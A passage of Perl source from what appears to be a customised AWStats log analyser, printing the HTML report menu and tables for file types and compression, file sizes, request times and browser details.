				print( $frame? "<tr><td class=\"awsm\">" : "" );
				print "<a href=\"$linkanchor#urls\"$targetpage>" . _t("Viewed pages") . "</a>";
				print( $frame? "</td>\n</tr>\n" : " &nbsp; " );
			}
			if ($ShowPagesStats) {
				print "<a href=\""
				  . (
					$ENV{'GATEWAY_INTERFACE'} || !$StaticLinks
					? XMLEncode(
						"$AWScript${NewLinkParams}output=urldetail")
					: "$StaticLinks.urldetail.$StaticExt"
				  )
				  . "\"$NewLinkTarget>" . _t("Full list") . "</a>";
				print( $frame? "</td>\n</tr>\n" : " &nbsp; " );
			}
			if ( $ShowPagesStats =~ /E/i ) {
				print "<a href=\""
				  . (
					$ENV{'GATEWAY_INTERFACE'} || !$StaticLinks
					? XMLEncode(
						"$AWScript${NewLinkParams}output=urlentry")
					: "$StaticLinks.urlentry.$StaticExt"
				  )
				  . "\"$NewLinkTarget>" . _t("Entry") . "</a>";
				print( $frame? "</td>\n</tr>\n" : " &nbsp; " );
			}
			if ( $ShowPagesStats =~ /X/i ) {
				print "<a href=\""
				  . (
					$ENV{'GATEWAY_INTERFACE'} || !$StaticLinks
					? XMLEncode("$AWScript${NewLinkParams}output=urlexit")
					: "$StaticLinks.urlexit.$StaticExt"
				  )
				  . "\"$NewLinkTarget>" . _t("Exit") . "</a>";
				print( $frame? "</td>\n</tr>\n" : " &nbsp; " );
			}
			if ($ShowOSStats) {
				print( $frame? "<tr><td class=\"awsm\">" : "" );
				print
				  "<a href=\"$linkanchor#os\"$targetpage>" . _t("Operating Systems") . "</a>";
				print( $frame? "</td>\n</tr>\n" : " &nbsp; " );
			}
			if ($ShowOSStats) {
				print "<a href=\""
				  . (
					$ENV{'GATEWAY_INTERFACE'} || !$StaticLinks
					? XMLEncode(
						"$AWScript${NewLinkParams}output=osdetail")
					: "$StaticLinks.osdetail.$StaticExt"
				  )
				  . "\"$NewLinkTarget>" . _t("DetailedOS") . "</a>";
				print( $frame? "</td>\n</tr>\n" : " &nbsp; " );
			}
			if ($ShowOSStats) {
				print "<a href=\""
				  . (
					$ENV{'GATEWAY_INTERFACE'} || !$StaticLinks
					? XMLEncode(
						"$AWScript${NewLinkParams}output=unknownos")
					: "$StaticLinks.unknownos.$StaticExt"
				  )
				  . "\"$NewLinkTarget>" . _t("unknownos") . "</a>";
				print( $frame? "</td>\n</tr>\n" : " &nbsp; " );
			}
			if ($ShowBrowsersStats) {
				print( $frame? "<tr><td class=\"awsm\">" : "" );
				print "<a href=\"$linkanchor#browsers\"$targetpage>" . _t("Browsers") . "</a>";
				print( $frame? "</td>\n</tr>\n" : " &nbsp; " );
			}
			if ($ShowBrowsersStats) {
				print "<a href=\""
				  . (
					$ENV{'GATEWAY_INTERFACE'} || !$StaticLinks
					? XMLEncode(
						"$AWScript${NewLinkParams}output=browserdetail")
					: "$StaticLinks.browserdetail.$StaticExt"
				  )
				  . "\"$NewLinkTarget>" . _t("DetailedBS") . "</a>";
				print( $frame? "</td>\n</tr>\n" : " &nbsp; " );
			}
			if ($ShowBrowsersStats) {

				print "<a href=\""
				  . (
					$ENV{'GATEWAY_INTERFACE'} || !$StaticLinks
					? XMLEncode(
						"$AWScript${NewLinkParams}output=unknownbrowser")
					: "$StaticLinks.unknownbrowser.$StaticExt"
				  )
				  . "\"$NewLinkTarget>" . _t("unknownbrowser") . "</a>";
				print( $frame? "</td>\n</tr>\n" : " &nbsp; " );
			}
			if ($ShowScreenSizeStats) {
				print( $frame? "<tr><td class=\"awsm\">" : "" );
				print "<a href=\"$linkanchor#screensizes\"$targetpage>" . _t("Screen sizes") . "</a>";
				print( $frame? "</td>\n</tr>\n" : " &nbsp; " );
			}
			if ($linetitle) { print( $frame? "" : "</td>\n</tr>\n" ); }

			# Referers
			%menu = (
				'referer'      => $ShowOriginStats ? 1 : 0,
				'refererse'    => $ShowOriginStats ? 2 : 0,
				'refererpages' => $ShowOriginStats ? 3 : 0,
				'keys' => ( $ShowKeyphrasesStats || $ShowKeywordsStats )
				? 4
				: 0,
				'keyphrases' => $ShowKeyphrasesStats ? 5 : 0,
				'keywords'   => $ShowKeywordsStats   ? 6 : 0
			);
			%menulink = (
				'referer'      => 1,
				'refererse'    => 2,
				'refererpages' => 2,
				'keys'         => 1,
				'keyphrases'   => 2,
				'keywords'     => 2
			);
			%menutext = (
				'referer'      => _t("Origin"),
				'refererse'    => _t("Search Engines"),
				'refererpages' => _t("External pages"),
				'keys'         => _t("Keyphrases/Keywords"),
				'keyphrases'   => _t("Keyphrases"),
				'keywords'     => _t("Keywords")
			);
			HTMLShowMenuCateg(
				'referers',     _t("Referers"),
				'menu7.png',    $frame,
				$targetpage,    $linkanchor,
				$NewLinkParams, $NewLinkTarget,
				\%menu,         \%menulink,
				\%menutext
			);
			
			# Others
			%menu = (
				'filetypes' => ( $ShowFileTypesStats =~ /C/i ) ? 1 : 0,
				'protocol'  => $ShowProtocolStats ? 2 : 0,
				'iconstatus' => ( scalar keys %_icon_status ) ? 3 : 0,
				'errors'    => ( $ShowHTTPErrorsStats || $ShowSMTPErrorsStats ) ? 4 : 0,
				'clusters'  => $ShowClusterStats ? 5 : 0
			);
			%menulink = (
				'filetypes'  => 1,
				'protocol'   => 1,
				'iconstatus' => 1,
				'errors'     => 1,
				'clusters'   => 1
			);
			%menutext = (
				'filetypes'  => _t("Compression"),
				'protocol'   => _t("HTTP Protocol Versions"),
				'iconstatus' => _t("Icon Files Status"),
				'errors'     => ( $ShowSMTPErrorsStats ? _t("SMTP Error codes") : _t("HTTP Status Statistics") ),
				'clusters'   => _t("Clusters")
			);
			my $idx = 0;
			foreach ( sort keys %TrapInfosForHTTPErrorCodes ) {
				$menu{"errors$_"}     = $ShowHTTPErrorsStats ? 4+$idx : 0;
				$menulink{"errors$_"} = 2;
				$menutext{"errors$_"} = _t("Page detail") . ' (' . $_ . ')';
				$idx++;
			}
			HTMLShowMenuCateg(
				'others',       _t("Others"),
				'menu8.png',    $frame,
				$targetpage,    $linkanchor,
				$NewLinkParams, $NewLinkTarget,
				\%menu,         \%menulink,
				\%menutext
			);

			# Extra/Marketing
			%menu     = ();
			%menulink = ();
			%menutext = ();
			my $i = 1;
			foreach ( 1 .. @ExtraName - 1 ) {
				$menu{"extra$_"}        = $i++;
				$menulink{"extra$_"}    = 1;
				$menutext{"extra$_"}    = $ExtraName[$_];
				$menu{"allextra$_"}     = $i++;
				$menulink{"allextra$_"} = 2;
				$menutext{"allextra$_"} = _t("Full list");
			}
			HTMLShowMenuCateg(
				'extra',        _t("Extra/Marketing"),
				'',             $frame,
				$targetpage,    $linkanchor,
				$NewLinkParams, $NewLinkTarget,
				\%menu,         \%menulink,
				\%menutext
			);
			
			if ( $FrameName eq 'mainright' ) {
				print "</table>\n";
				print "</td>\n";
				print "</tr>\n";
				print "</table>\n";
			}
			
			print "<br>";
		}
		else {

			# Menu Applet
			if ($frame) { }
			else { }
		}
	}

	# Print Back link
	elsif ( !$HTMLOutput{'main'} ) {
		print "<br><center>\n";
		$NewLinkParams =~ s/(^|&|&amp;)hostfilter=[^&]*//i;
		$NewLinkParams =~ s/(^|&|&amp;)urlfilter=[^&]*//i;
		$NewLinkParams =~ s/(^|&|&amp;)refererpagesfilter=[^&]*//i;
		$NewLinkParams =~ s/(&amp;|&)+/&amp;/i;
		$NewLinkParams =~ s/^&amp;//;
		$NewLinkParams =~ s/&amp;$//;
		if (   !$DetailedReportsOnNewWindows
			|| $FrameName eq 'mainright'
			|| $QueryString =~ /buildpdf/i )
		{
			my $back_link = $ENV{'GATEWAY_INTERFACE'} || !$StaticLinks
				? XMLEncode("$AWScript${NewLinkParams}&framename=mainright")
				: "$StaticLinks.$StaticExt";
			
			print "<tr><td class=\"aws\"><a href=\"$back_link\">"
				. _t("Back to main page") . "</a></td>\n</tr>\n";
		}
		else {
			print "<tr><td class=\"aws\">";
			print "<a href=\"javascript:if(window.parent && window.parent != window)window.parent.close(); else if(window.opener)window.close(); else history.back();\">" 
				. _t("Close window") . "</a>";
			
			my $base_dir = $DirCgi;
			$base_dir =~ s!/$!!;
			print " | <a href=\"$base_dir/\">" . _t("Back page") . "</a>";
			print "</td>\n</tr>\n";
		}
		print "</center>\n";
	}
	print "\n";
}

#------------------------------------------------------------------------------
# Function:     Prints the File Type table
# Parameters:   _
# Input:        $NewLinkParams, $NewLinkTargets
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainFileType{
	my $NewLinkParams = shift;
	my $NewLinkTarget = shift;
	if (!($LevelForFileTypesDetection > 0)){return;}
	if ($Debug) { debug( "ShowFileTypesStatsCompressionStats", 2 ); }
	print "$Center<a name=\"filetypes\">&nbsp;</a>";
	my $Totalh = 0;
	foreach ( keys %_filetypes_h ) { $Totalh += $_filetypes_h{$_}; }
	my $Totalk = 0;
	foreach ( keys %_filetypes_k ) { $Totalk += $_filetypes_k{$_}; }
	my $title = "🏷️ " . _t("File type");
	if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {
		# extend the title to include the added link 
		$title = "$title &nbsp; - &nbsp; <a href=\"" . (XMLEncode(
		   "$AddLinkToExternalCGIWrapper" . "?section=FILETYPES&baseName=$DirData/$PROG"
		   . "&month=$MonthRequired&year=$YearRequired&day=$DayRequired"
		   . "&siteConfig=$SiteConfig" )
		   . "\"$NewLinkTarget>" . _t("Export") . "</a>");
	} 

	if ( $ShowFileTypesStats =~ /C/i ) { $title .= " - " . _t("Compression"); }
	
	# build keylist at top
	&BuildKeyList( $MaxRowsInHTMLOutput, 1, \%_filetypes_h, \%_filetypes_h );
		
	&tab_head( "$title", 19, 0, 'filetypes' );
		
	# Graph the top five in a pie chart
	if (scalar @keylist > 1){
		foreach my $pluginname ( keys %{ $PluginsLoaded{'ShowGraph'} } )
		{
			my @blocklabel = ();
			my @valdata = ();
			my @valcolor = ($color_p);
			my $cnt = 0;
			foreach my $key (@keylist) {
				push @valdata, int( $_filetypes_h{$key} / $Totalh * 1000 ) / 10;
				push @blocklabel, "$key";
				$cnt++;
				if ($cnt > 4) { last; }
			}
			print "<tr><td colspan=\"7\">";
			my $function = "ShowGraph_$pluginname";
			&$function(
				_t("File type"), 		"filetypes",
				0, 						\@blocklabel,
				0, 						\@valcolor,
				0, 						0,
				0, 						\@valdata
			);
			print "</td>\n</tr>\n";
		}
	}
	
	print "<tr bgcolor=\"#$color_TableBGRowTitle\"><th colspan=\"2\" style=\"white-space: nowrap;\">" . _t("File type") . "</th>\n";
	print "<th>" . _t("Format description") . "</th>\n";
	if ( $ShowFileTypesStats =~ /H/i ) {
		print "<th bgcolor=\"#$color_h\" width=\"80\""
		  . Tooltip(4)
		  . ">" . _t("Hits") . "</th>\n<th bgcolor=\"#$color_h\" width=\"80\">" . _t("Percent") . "</th>\n";
	}
	if ( $ShowFileTypesStats =~ /B/i ) {
		print "<th bgcolor=\"#$color_k\" width=\"80\""
		  . Tooltip(5)
		  . ">" . _t("Bandwidth") . "</th>\n<th bgcolor=\"#$color_k\" width=\"80\">" . _t("Percent") . "</th>\n";
	}
	if ( $ShowFileTypesStats =~ /C/i ) {
		print "<th bgcolor=\"#$color_k\" width=\"100\">" . _t("In") . "</th>\n<th bgcolor=\"#$color_k\" width=\"100\">" . _t("Out") . "</th>\n<th bgcolor=\"#$color_k\" width=\"100\">" . _t("Saved") . "</th>\n";
	}
	print "</tr>\n";
	my $total_con = 0;
	my $total_cre = 0;
	my $count     = 0;
	foreach my $key (@keylist) {
		my $p_h = '&nbsp;';
		my $p_k = '&nbsp;';
		if ($Totalh) {
			$p_h = int( $_filetypes_h{$key} / $Totalh * 1000 ) / 10;
			$p_h = "$p_h %";
		}
		if ($Totalk) {
			$p_k = int( $_filetypes_k{$key} / $Totalk * 1000 ) / 10;
			$p_k = "$p_k %";
		}
		if ( $key eq 'Unknown' ) {
			print "<tr><td"
			  . ( $count ? "" : " width=\"$WIDTHCOLICON\"" )
			  . "><img src=\"$DirIcons\/mime\/unknown.svg\""
			  . AltTitle("")
			  . " width=\"24\" height=\"auto\" style=\"vertical-align:middle; object-fit:contain;\" /></td>\n<td class=\"aws\" colspan=\"2\"><span style=\"color: #$color_other\">" . _t("Unknown File Type") . "</span></td>\n";
		}
		else {
			my $nameicon = $MimeHashLib{$key}[0] || "notavailable";
			my $nametype = $MimeHashFamily{$MimeHashLib{$key}[0]} || "&nbsp;";
			print "<tr><td"
			  . ( $count ? "" : " width=\"$WIDTHCOLICON\"" )
			  . "><img src=\"$DirIcons\/mime\/$nameicon.svg\""
			  . AltTitle("")
			  . " width=\"24\" height=\"auto\" style=\"vertical-align:middle; object-fit:contain;\" /></td>\n<td class=\"aws\">$key</td>\n";
			print "<td class=\"aws\">" . _t($nametype) . "</td>\n";
		}
		if ( $ShowFileTypesStats =~ /H/i ) {
			print "<td>".Format_Number($_filetypes_h{$key})."</td>\n<td>$p_h</td>\n";
		}
		if ( $ShowFileTypesStats =~ /B/i ) {
			print '<td nowrap="nowrap">'
			  . Format_Bytes( $_filetypes_k{$key} )
			  . "</td>\n<td>$p_k</td>\n";
		}
		if ( $ShowFileTypesStats =~ /C/i ) {
			if ( $_filetypes_gz_in{$key} ) {
				my $percent = int(
					100 * (
						1 - $_filetypes_gz_out{$key} /
						  $_filetypes_gz_in{$key}
					)
				);
				printf(
					"<td>%s</td>\n<td>%s</td>\n<td>%s (%s%)</td>\n",
					Format_Bytes( $_filetypes_gz_in{$key} ),
					Format_Bytes( $_filetypes_gz_out{$key} ),
					Format_Bytes(
						$_filetypes_gz_in{$key} -
						  $_filetypes_gz_out{$key}
					),
					$percent
				);
				$total_con += $_filetypes_gz_in{$key};
				$total_cre += $_filetypes_gz_out{$key};
			}
			else {
				print "<td>&nbsp;</td>\n<td>&nbsp;</td>\n<td>&nbsp;</td>\n";
			}
		}
		print "</tr>\n";
		$count++;
	}

	# Add total (only useful if compression is enabled)
	if ( $ShowFileTypesStats =~ /C/i ) {
		my $colspan = 3;
		if ( $ShowFileTypesStats =~ /H/i ) { $colspan += 2; }
		if ( $ShowFileTypesStats =~ /B/i ) { $colspan += 2; }
		print "<tr>";
		print "<td class=\"aws\" colspan=\"$colspan\"><b>" . _t("Compression") . "</b></td>\n";
		if ( $ShowFileTypesStats =~ /C/i ) {
			if ($total_con) {
				my $percent =
				  int( 100 * ( 1 - $total_cre / $total_con ) );
				printf(
					"<td>%s</td>\n<td>%s</td>\n<td>%s (%s%)</td>\n",
					Format_Bytes($total_con),
					Format_Bytes($total_cre),
					Format_Bytes( $total_con - $total_cre ),
					$percent
				);
			}
			else {
				print "<td>&nbsp;</td>\n<td>&nbsp;</td>\n<td>&nbsp;</td>\n";
			}
		}
		print "</tr>\n";
	}
	&tab_end();
}

#------------------------------------------------------------------------------
# Function:     Prints the File Size Table
# Parameters:   _
# Input:        _
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainFileSize{
		if ($Debug) { debug("ShowFileSizesStats",2); }
		my $FirstTime = 0;
		my $LastTime  = 0;
		foreach my $key ( keys %FirstTime ) {
				my $keyqualified = 0;
				if ( $MonthRequired eq 'all' ) { $keyqualified = 1; }
				if ( $key =~ /^$YearRequired$MonthRequired/ ) { $keyqualified = 1; }
				if ($keyqualified) {
						if ( $FirstTime{$key}
								&& ( $FirstTime == 0 || $FirstTime > $FirstTime{$key} ) )
						{
								$FirstTime = $FirstTime{$key};
						}
						if ( $LastTime < ( $LastTime{$key} || 0 ) ) {
								$LastTime = $LastTime{$key};
						}
				}
		}

		my $inicio = 0;
		my $fim = 0;
		if ($FirstTime =~ /$regdate/o) { $inicio = Time::Local::timelocal($6, $5, $4, $3, $2-1, $1); }
		if ($LastTime =~ /$regdate/o) { $fim = Time::Local::timelocal($6, $5, $4, $3, $2-1, $1); }
		my $periodo = $fim - $inicio;
		my $number_of_requests = 0;
		my $request_frequency_average = 0;
		foreach my $key (@PayloadRange) {
				$number_of_requests += $_filesize{$key};
		}
		if ($periodo) { $request_frequency_average = $number_of_requests/$periodo;}
		else { $request_frequency_average = 0 };
		print "$Center<a name=\"filesizes\">&nbsp;</a>";
		my $title = _t("File size");
		&tab_head($title, 19, 0, 'filesizes');
		my $Totals = 0;
		my $average_s = 0;
		foreach (@PayloadRange) {
				$average_s += ( $_filesize{$_} || 0 ) * $PayloadAverage{$_};
				$Totals += $_filesize{$_} || 0;
		}
		if ($Totals) { $average_s = int($average_s / $Totals); }
		else { $average_s = '?'; }
		print "<tr bgcolor=\"#$color_TableBGRowTitle\"".Tooltip(1)."><th>" . _t("Total requests") . ": $number_of_requests - " . _t("Period") . ": $periodo " . _t("Seconds") . " - " . _t("Average frequency") . ": ".sprintf ("%.6f",$request_frequency_average)."</th><th bgcolor=\"#$color_s\" width=\"80\">" . _t("Frequency") . "</th><th bgcolor=\"#$color_s\" width=\"80\">" . _t("Hits") . "</th><th bgcolor=\"#$color_s\" width=\"80\">" . _t("Percent") . "</th></tr>\n";
		my $total_s = 0;
		my $count = 0;
		foreach my $key (@PayloadRange) {
				my $p = 0;
				my $f = 0;
				if ($Totals) { $p = int($_filesize{$key} / $Totals * 1000) / 10; }
				if ($periodo) { $f = $_filesize{$key} / $periodo; }
				$total_s += $_filesize{$key} || 0;
				print "<tr><td class=\"aws\">$key</td>\n";
				print "<td>".($_filesize{$key}? sprintf("%.5f",$f):"&nbsp;")."</td>\n";
				print "<td>".($_filesize{$key}? $_filesize{$key}:"&nbsp;")."</td>\n";
				print "<td>".($_filesize{$key}? "$p %":"&nbsp;")."</td>\n";
				print "</tr>\n";
				$count++;
		}
		my $rest_s = $TotalVisits-$total_s;
		if ($rest_s > 0) {
				my $p = 0;
				if ($TotalVisits) { $p = int($rest_s / $TotalVisits * 1000) / 10; }
				print "<tr".Tooltip(20)."><td class=\"aws\"><span style=\"color: #$color_other\">" . _t("Unknown Size") . "</span></td>\n";
				print "<td>$rest_s</td>\n";
				print "<td>".($rest_s?"$p %":"&nbsp;")."</td>\n";
				print "</tr>\n";
		}

		&tab_end();
}

#------------------------------------------------------------------------------
# Function:     Prints Request Time table
# Parameters:   _
# Input:        _
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainRequestTime{
		if ($Debug) { debug("ShowRequestTimesStats", 2); }
		my $FirstTime = 0;
		my $LastTime  = 0;
		foreach my $key ( keys %FirstTime ) {
				my $keyqualified = 0;
				if ( $MonthRequired eq 'all' ) { $keyqualified = 1; }
				if ( $key =~ /^$YearRequired$MonthRequired/ ) { $keyqualified = 1; }
				if ($keyqualified) {
						if ( $FirstTime{$key}
								&& ( $FirstTime == 0 || $FirstTime > $FirstTime{$key} ) )
						{
								$FirstTime = $FirstTime{$key};
						}
						if ( $LastTime < ( $LastTime{$key} || 0 ) ) {
								$LastTime = $LastTime{$key};
						}
				}
		}

		my $inicio = 0;
		my $fim = 0;
		if ($FirstTime =~ /$regdate/o) { $inicio = Time::Local::timelocal($6,$5,$4,$3,$2-1,$1); }
		if ($LastTime =~ /$regdate/o) { $fim = Time::Local::timelocal($6,$5,$4,$3,$2-1,$1); }
		my $periodo = $fim - $inicio;
		my $number_of_requests = 0;
		my $request_frequency_average = 0;
		foreach my $key (@TimeRange) {
				$number_of_requests += $_requesttime{$key};
		}
		if ($periodo) { $request_frequency_average = $number_of_requests / $periodo;}
		else { $request_frequency_average = 0};
		print "$Center<a name=\"requesttimes\">&nbsp;</a>";
		my $title = _t("Request time");
		&tab_head($title, 19, 0, 'requesttimes');
		my $Totals = 0;
		my $average_s = 0;
		foreach (@TimeRange) {
				$average_s += ($_requesttime{$_} || 0) * $TimeAverage{$_};
				$Totals += $_requesttime{$_} || 0;
		}
		if ($Totals) { $average_s = int($average_s / $Totals); }
		else { $average_s = '?'; }
		print "<tr bgcolor=\"#$color_TableBGRowTitle\"".Tooltip(1)."><th>" . _t("Total requests") . ": $number_of_requests - " . _t("Period") . ": $periodo " . _t("Seconds") . " - " . _t("Average frequency") . ": ".sprintf ("%.6f",$request_frequency_average)."</th><th bgcolor=\"#$color_s\" width=\"80\">" . _t("Frequency") . "</th><th bgcolor=\"#$color_s\" width=\"80\">" . _t("Hits") . "</th><th bgcolor=\"#$color_s\" width=\"80\">" . _t("Percent") . "</th></tr>\n";
		my $total_s = 0;
		my $count = 0;
		foreach my $key (@TimeRange) {
				my $p = 0;
				my $f = 0;
				if ($Totals) { $p = int($_requesttime{$key} / $Totals * 1000) / 10; }
				if ($periodo) { $f = $_requesttime{$key} / $periodo; }
				$total_s += $_requesttime{$key} || 0;
				print "<tr><td class=\"aws\">$key</td>\n";
				print "<td>".($_requesttime{$key} ? sprintf("%.5f",$f) : "&nbsp;")."</td>\n";
				print "<td>".($_requesttime{$key} ? $_requesttime{$key} : "&nbsp;")."</td>\n";
				print "<td>".($_requesttime{$key} ? "$p %" : "&nbsp;")."</td>\n";
				print "</tr>\n";
				$count++;
		}
		my $rest_s = $TotalVisits - $total_s;
		if ($rest_s > 0) {
				my $p = 0;
				if ($TotalVisits) { $p = int($rest_s / $TotalVisits * 1000) / 10; }
				print "<tr".Tooltip(20)."><td class=\"aws\"><span style=\"color: #$color_other\">" . _t("Unknown Time") . "</span></td>\n";
				print "<td>$rest_s</td>\n";
				print "<td>".($rest_s?"$p %":"&nbsp;")."</td>\n";
				print "</tr>\n";
		}

		&tab_end();
}

#------------------------------------------------------------------------------
# Function:     Prints the Browser Detail frame or static page
# Parameters:   _
# Input:        _
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLShowBrowserDetail{
	# Show browsers versions
	print "$Center<a name=\"browsersversions\">&nbsp;</a>";
	my $title = _t("Browsers");
	&tab_head( "$title", 19, 0, 'browsersversions' );
	print "<tr bgcolor=\"#$color_TableBGRowTitle\"><th colspan=\"2\">" . _t("Detailed") . "</th>\n";
	print "<th width=\"80\">" . _t("Unique visitors") . "</th><th bgcolor=\"#$color_p\" width=\"80\">" . _t("Pages") . "</th><th bgcolor=\"#$color_p\" width=\"80\">" . _t("Percent") . "</th>\n";
	print "<th bgcolor=\"#$color_h\" width=\"80\">" . _t("Hits") . "</th><th bgcolor=\"#$color_h\" width=\"80\">" . _t("Percent") . "</th>\n";
	print "<th>&nbsp;</th>";
	print "</tr>\n";
	my $total_h = 0;
	my $total_p = 0;
	my $count = 0;
	&BuildKeyList( MinimumButNoZero( scalar keys %_browser_h, 500 ),
		1, \%_browser_h, \%_browser_p );
	my %keysinkeylist = ();
	my $max_h = 1;
	my $max_p = 1;

	# Count total by family
	my %totalfamily_h = ();
	my %totalfamily_p = ();
	my $TotalFamily_h = 0;
	my $TotalFamily_p = 0;
  	BROWSERLOOP: foreach my $key (@keylist) {
		$total_h += $_browser_h{$key};
		if ( $_browser_h{$key} > $max_h ) {
			$max_h = $_browser_h{$key};
		}
		$total_p += $_browser_p{$key};
		if ( $_browser_p{$key} > $max_p ) {
			$max_p = $_browser_p{$key};
		}
		foreach my $family ( keys %BrowsersFamily ) {
			if ( $key =~ /^$family/i ) {
				$totalfamily_h{$family} += $_browser_h{$key};
				$totalfamily_p{$family} += $_browser_p{$key};
				$TotalFamily_h          += $_browser_h{$key};
				$TotalFamily_p          += $_browser_p{$key};
				next BROWSERLOOP;
			}
		}
	}

	# Write records grouped in a browser family
	foreach my $family (
		sort { $BrowsersFamily{$a} <=> $BrowsersFamily{$b} }
		keys %BrowsersFamily
	  )
	{
		my $p_h = '&nbsp;';
		my $p_p = '&nbsp;';
		if ($total_h) {
			$p_h = int( $totalfamily_h{$family} / $total_h * 1000 ) / 10;
			$p_h = "$p_h %";
		}
		if ($total_p) {
			$p_p = int( $totalfamily_p{$family} / $total_p * 1000 ) / 10;
			$p_p = "$p_p %";
		}
		my $familyheadershown = 0;

		#foreach my $key ( reverse sort keys %_browser_h ) {
		foreach my $key ( reverse sort SortBrowsers keys %_browser_h ) {
			if ( $key =~ /^$family(.*)/i ) {
				if ( !$familyheadershown ) {
					print "<tr bgcolor=\"#F6F6F6\"><td class=\"aws\" colspan=\"2\"><b>"
				  . uc($family)
				  . "</b></td>\n";
				print "<td>&nbsp;</td><td><b>"
				  . Format_Number(int( $totalfamily_p{$family} ))
				  . "</b></td><td><b>$p_p</b></td>\n";
				print "<td><b>"
				  . Format_Number(int( $totalfamily_h{$family} ))
				  . "</b></td><td><b>$p_h</b></td><td>&nbsp;</td>\n";
				print "</tr>\n";
				$familyheadershown = 1;
			}
			$keysinkeylist{$key} = 1;
			my $ver = $1;
			my $p_h = '&nbsp;';
			my $p_p = '&nbsp;';
			if ($total_h) {
				$p_h = 
				  int( $_browser_h{$key} / $total_h * 1000 ) / 10;
				$p_h = "$p_h %";
			}
			if ($total_p) {
				$p_p =
				  int( $_browser_p{$key} / $total_p * 1000 ) / 10;
				$p_p = "$p_p %";
			}
			print "<tr>";
			print "<td"
			  . ( $count ? "" : " width=\"$WIDTHCOLICON\"" )
			  . "><img src=\"$DirIcons\/os\/$family.svg\""
			  . AltTitle("")
			  . " width=\"24\" height=\"auto\" style=\"vertical-align:middle; object-fit:contain;\" /></td>\n";
			print "<td class=\"aws\">"
			  . ucfirst($family) . " "
			  . ( $ver ? "$ver" : "?" ) . "</td>\n";
			print "<td>"
			  . (
				$BrowsersHereAreGrabbers{$family}
				? "<b>" . _t("Grabber") . "</b>"
				: _t("Pages")
			  )
			  . "</td>\n";
			my $bredde_h = 0;
			my $bredde_p = 0;
			if ( $max_h > 0 ) {
				$bredde_h =
				  int( $BarWidth * ( $_browser_h{$key} || 0 ) /
					  $max_h ) + 1;
			}
			if ( ( $bredde_h == 1 ) && $_browser_h{$key} ) {
				$bredde_h = 2;
			}
			if ( $max_p > 0 ) {
				$bredde_p =
				  int( $BarWidth * ( $_browser_p{$key} || 0 ) /
					  $max_p ) + 1;
			}
			if ( ( $bredde_p == 1 ) && $_browser_p{$key} ) {
				$bredde_p = 2;
			}
			print "<td>" . Format_Number($_browser_p{$key}) . "</td><td>$p_p</td>\n";
			print "<td>" . Format_Number($_browser_h{$key}) . "</td><td>$p_h</td>\n";
			print "<td class=\"aws\">";

			# alt and title are not provided to reduce page size
			if ($ShowBrowsersStats) {
				print "<div style=\"background-color: #$color_p; width: ${bredde_p}px; height: 5px; border-radius: 3px;\"></div>";
				print "<div style=\"background-color: #$color_h; width: ${bredde_h}px; height: 5px; border-radius: 3px;\"></div>";
			}
				print "</td>\n";
				print "</tr>\n";
				$count++;
			}
		}
	}

	# Write other records
	my $familyheadershown = 0;
	foreach my $key (@keylist) {
		if ( $keysinkeylist{$key} ) { next; }
		if ( !$familyheadershown )  {
			my $p_h = '&nbsp;';
			my $p_p = '&nbsp;';
			if ($total_p) {
				$p_p =
				  int( ( $total_p - $TotalFamily_p ) / $total_p * 1000 ) /
				  10;
				$p_p = "$p_p %";
			}
			if ($total_h) {
				$p_h =
				  int( ( $total_h - $TotalFamily_h ) / $total_h * 1000 ) /
				  10;
				$p_h = "$p_h %";
			}
			print "<tr bgcolor=\"#F6F6F6\"><td class=\"aws\" colspan=\"2\"><b>" . _t("Others (browsers main)") . "</b></td>\n";
			print "<td>&nbsp;</td><td><b>"
			  . Format_Number(( $total_p - $TotalFamily_p ))
			  . "</b></td><td><b>$p_p</b></td>\n";
			print "<td><b>"
			  . Format_Number(( $total_h - $TotalFamily_h ))
			  . "</b></td><td><b>$p_h</b></td><td>&nbsp;</td>\n";
			print "</tr>\n";
			$familyheadershown = 1;
		}
		my $p_h = '&nbsp;';
		my $p_p = '&nbsp;';
		if ($total_h) {
			$p_h = int( $_browser_h{$key} / $total_h * 1000 ) / 10;
			$p_h = "$p_h %";
		}
		if ($total_p) {
			$p_p = int( $_browser_p{$key} / $total_p * 1000 ) / 10;
			$p_p = "$p_p %";
		}
		print "<tr>";
		
		# 处理设备类型
		my ($is_device, $display_name, $icon_name) = parse_device_key($key);
		
		if ( $key eq 'Unknown' ) {
			print "<td"
			  . ( $count ? "" : " width=\"$WIDTHCOLICON\"" )
			  . "><span style=\"font-size:24px;\">❓</span>"
			  . "</td><td class=\"aws\"><span style=\"color: #$color_other\">" . _t("Unknown Browser") . "</span></td><td width=\"80\">?</td>\n";
		}
		elsif ($is_device) {
			# 设备类型：使用 Emoji 而不是 SVG 图标
			print "<td"
			  	. ( $count ? "" : " width=\"$WIDTHCOLICON\"" )
				. "><span style=\"font-size:24px;\">$icon_name</span>"
				. "</td><td class=\"aws\">$display_name</td><td>"
				. (
					$BrowsersHereAreGrabbers{$key}
					? "<b>" . _t("Grabber") . "</b>"
					: _t("Pages")
				  )
				. "</td>\n";
		}
		else {
			my $keywithoutcumul = $key;
			$keywithoutcumul =~ s/cumul$//i;
			my $libbrowser = $BrowsersHashIDLib{$keywithoutcumul} || $keywithoutcumul;
			my $nameicon = $BrowsersHashIcon{$keywithoutcumul} || "notavailable";
			print "<td"
			  	. ( $count ? "" : " width=\"$WIDTHCOLICON\"" )
				. "><img src=\"$DirIcons\/os\/$nameicon.svg\""
			  	. AltTitle("")
			  	. " width=\"24\" height=\"auto\" style=\"vertical-align:middle; object-fit:contain;\" /></td><td class=\"aws\">$libbrowser</td><td>"
			  	. (
				$BrowsersHereAreGrabbers{$key}
				? "<b>" . _t("Grabber") . "</b>"
				: _t("Pages")
			  )
			  . "</td>\n";
		}

		my $bredde_h = 0;
		my $bredde_p = 0;
		if ( $max_h > 0 ) {
			$bredde_h =
			  int( $BarWidth * ( $_browser_h{$key} || 0 ) / $max_h ) +
			  1;
		}
		if ( $max_p > 0 ) {
			$bredde_p =
			  int( $BarWidth * ( $_browser_p{$key} || 0 ) / $max_p ) +
			  1;
		}
		if ( ( $bredde_h == 1 ) && $_browser_h{$key} ) {
			$bredde_h = 2;
		}
